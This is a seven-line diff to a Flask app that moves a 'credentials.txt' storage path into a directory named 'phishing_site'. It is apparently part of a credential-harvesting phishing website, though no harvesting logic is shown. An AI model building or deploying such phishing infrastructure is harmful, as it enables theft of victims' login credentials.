@@ -1,7 +1,7 @@
 from flask import Flask, render_template, request, redirect, url_for
 
 app = Flask(__name__)
-filename = 'resources/credentials.txt'
+filename = '/var/www/phishing_site/resources/credentials.txt'
 
 @app.route('/')
 def home():
